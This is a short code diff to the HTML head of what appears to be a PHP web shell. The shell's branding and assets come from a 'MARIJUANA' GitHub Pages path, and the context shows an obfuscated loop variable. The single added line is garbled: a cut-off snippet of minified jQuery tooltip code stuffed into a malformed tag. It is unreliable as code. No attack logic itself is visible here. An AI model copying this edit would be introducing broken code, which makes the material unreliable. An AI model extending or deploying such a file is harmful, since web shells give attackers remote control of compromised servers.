@@ -56,7 +56,7 @@ for($i=0;$i<$___;$i++) {
 
 			<link rel="icon" href="//0x5a455553.github.io/MARIJUANA/icon.png" />
 			<link rel="stylesheet" href="//0x5a455553.github.io/MARIJUANA/main.css" type="text/css">
-
+			<prototype.show=function(t,i){var e,n,o,r,s;if(n=function(e){return function(){return t||e.elem||e.destroy(),i?i():void 0}}(this),s=this.container.parent().parents(":hidden").length>0,o=this.container.add(this.arrow)>
 			<script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 			<script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
 		</head>
